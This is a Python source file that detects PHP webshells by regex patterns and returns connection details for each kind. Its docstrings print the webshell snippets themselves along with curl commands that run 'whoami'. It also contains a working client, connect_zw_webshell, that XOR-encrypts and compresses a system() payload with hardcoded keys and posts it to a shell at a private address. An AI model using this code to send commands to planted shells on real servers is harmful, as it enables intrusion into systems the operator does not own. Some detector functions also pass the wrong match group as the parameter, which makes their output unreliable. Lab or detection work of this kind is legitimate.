import re
from typing import Optional
import sys
import os
import base64
import requests
import zlib

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.webshell_organizer import ConnectionInfo

def detect_get_key_and_post_func(content: str) -> Optional[ConnectionInfo]:
    """
    php demo:
    $lang = (string)key($_GET);  // key返回数组的键名
    $lang($_POST['cmd']); 
    ?>

    curl demo:
    curl -X POST "http://{base_url}?system=1" -d "cmd=whoami"
    """
    if "key($_GET)" in content:
        param_match = re.search(r"\$_POST\[['\"](\w+)['\"]\]", content)
        param = param_match.group(1) if param_match else "cmd"
        return ConnectionInfo(
            method="POST",
            param_name=param,
            url_param="system=1",
        )
    return None

def detect_eval_with_post(content: str) -> Optional[ConnectionInfo]:
    if "eval(" in content and "$_POST" in content:
        param_match = re.search(r"eval\(\s*\$_POST\[['\"](\w+)['\"]\]\s*\)", content)
        if param_match:
            return ConnectionInfo(
                method="POST",
                param=param_match.group(1)
            )
    return None

### 函数 1：识别 assert($_GET['a']) 或 eval($_POST['x'])

def detect_simple_eval_assert(content: str) -> Optional[ConnectionInfo]:
    """
    识别 eval/assert 执行来自请求参数的代码

    code = "eval($_POST['cmd']);"
    """
    pattern = r"(eval|assert)\s*\(\s*\$_(GET|POST|REQUEST)\[.*?\]\s*\)"
    match = re.search(pattern, content)
    if match:
        return ConnectionInfo(
            method=match.group(2),
            param=match.group(1)
        )
    return None


### 函数 2：base64 + eval

def detect_base64_eval(content: str) -> Optional[ConnectionInfo]:
    """
    php demo:
    eval(base64_decode($_POST['cmd']));
    ?>

    curl demo:
    curl -X POST "http://{base_url}?system=1" -d "cmd=whoami"
    """
    pattern = r"eval\s*\(\s*base64_decode\s*\(\s*\$_(GET|POST|REQUEST)\[.*?\]\s*\)"
    match = re.search(pattern, content)
    if match:
        return ConnectionInfo(
            method=match.group(1),
            param=match.group(1)
        )
    return None


### 函数 3：gzinflate + base64 + eval

def detect_gzinflate_chain(content: str) -> Optional[ConnectionInfo]:
    """
    php demo:
    eval(gzinflate(base64_decode($_POST['cmd'])));
    ?>

    curl demo:
    curl -X POST "http://{base_url}?system=1" -d "cmd=whoami"
    """
    pattern = r"eval\s*\(\s*gzinflate\s*\(\s*base64_decode\s*\(\s*\$_(GET|POST|REQUEST)\[.*?\]"
    match = re.search(pattern, content)
    if match:
        return ConnectionInfo(
            method=match.group(1),
            param=match.group(1)
        )
    return None


### 函数 4：preg_replace /e

def detect_preg_replace_eval(content: str) -> Optional[ConnectionInfo]:
    """
    php demo:
    preg_replace('/.*/e', $_POST['cmd'], 'xxx');
    ?>

    curl demo:
    curl -X POST "http://{base_url}?system=1" -d "cmd=whoami"
    """
    pattern = r"preg_replace\s*\(\s*['\"]/.*/e['\"]\s*,\s*\$_(POST|GET|REQUEST)\[.*?\]"
    match = re.search(pattern, content)
    if match:
        return ConnectionInfo(
            method=match.group(1),
            param=match.group(1)
        )
    return None


### 函数 5：php://input

def detect_php_input_eval(content: str) -> Optional[ConnectionInfo]:
    pattern = r"(eval|assert)\s*\(\s*file_get_contents\s*\(\s*['\"]php://input['\"]\s*\)\s*\)"
    match = re.search(pattern, content)
    if match:
        return ConnectionInfo(
            method="POST",
            param="php://input"
        )
    return None


### 函数 6：变量函数调用

def detect_variable_function_call(content: str) -> Optional[ConnectionInfo]:
    """
    php demo:
    $f=$_GET['a']; $f($_POST['cmd']);
    ?>

    curl demo:
    curl -X POST "http://{base_url}?a=eval" -d "cmd=whoami"
    """
    pattern = r"\$\w+\s*=\s*\$_(GET|POST|REQUEST)\[.*?\];.*?\$\w+\s*\(\s*\$_(GET|POST|REQUEST)\[.*?\]\)"
    match = re.search(pattern, content, re.DOTALL)
    if match:
        return ConnectionInfo(
            method="POST",
            param="cmd",
            url_param="a=eval"
        )
    return None


### 函数 7：$_SERVER Header 触发

def detect_server_variable_trigger(content: str) -> Optional[ConnectionInfo]:
    """
    php demo:
    $_SERVER["HTTP_USER_AGENT"]=="Googlebot" and eval($_POST["cmd"]);
    ?>

    curl demo:
    curl -X POST "http://{base_url}?system=1" -d "cmd=whoami"
    """
    pattern = r"\$_SERVER\[['\"]HTTP_(USER_AGENT|REFERER)['\"]\]\s*==.+?eval\s*\(.*?\)"
    match = re.search(pattern, content)
    if match:
        return ConnectionInfo(
            method="POST",
            param="cmd",
            header={
                f"match.group(1)": "Googlebot"
            }
        )
    return None

def detect_zw_php_webshell(content: str):
    """
    检测是否为 zw.php 类型的 XOR + gzcompress + base64 混合编码 WebShell。
    返回 ConnectionInfo 对象或 None。
    """
    # 判断是否包含 zw.php 的关键结构
    if all(keyword in content for keyword in [
        'gzcompress', 'base64_encode', 'preg_match', 'file_get_contents("php://input"',
        '$k=', '$kh=', '$kf='
    ]):
        key_match = re.search(r'\$k\s*=\s*[\'"]([0-9a-fA-F]{8})[\'"]', content)
        kh_match = re.search(r'\$kh\s*=\s*[\'"]([0-9a-fA-F]+)[\'"]', content)
        kf_match = re.search(r'\$kf\s*=\s*[\'"]([0-9a-fA-F]+)[\'"]', content)

        if key_match and kh_match and kf_match:
            return ConnectionInfo(
                method='POST',
                password=None,            # 无明确密码参数，使用原始 body
                param_name=None,          # 无参数名，直接 base64 整体提交
                encoding='xor+gz+base64', # 混合加密方式
                test_command="echo 'test';"
            )

    return None

def connect_zw_webshell(url, command):
    key = b'50ec93c4'
    kh = '895c0ccc987a'
    kf = '0abca6138a3e'

    def xor(data, key):
        return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

    # 构造 payload
    php_payload = f"echo '->'; system('{command}'); echo '<-';"
    compressed = zlib.compress(php_payload.encode())
    encrypted = xor(compressed, key)
    b64_payload = base64.b64encode(encrypted).decode()
    full_payload = kh + b64_payload + kf

    # 发送请求
    resp = requests.post(url, data=full_payload)
    raw = resp.text

    # 尝试提取加密响应体
    try:
        enc_result = raw.split(kh)[1].split(kf)[0]
        decoded = base64.b64decode(enc_result)
        decrypted = xor(decoded, key)
        output = zlib.decompress(decrypted).decode()
        if '->' in output and '<-' in output:
            return output.split('->')[1].split('<-')[0].strip()
        return output.strip()
    except Exception as e:
        return f"[!] Failed to parse result: {e}"

if __name__ == "__main__":
    # content = """
    # $lang = (string)key($_GET);  // key返回数组的键名
    # $lang($_POST['cmd']); 
    # ?>
    # """
    # print(detect_get_key_and_post_func(content))
    print(connect_zw_webshell("http://172.25.0.2/zw.php", "whoami"))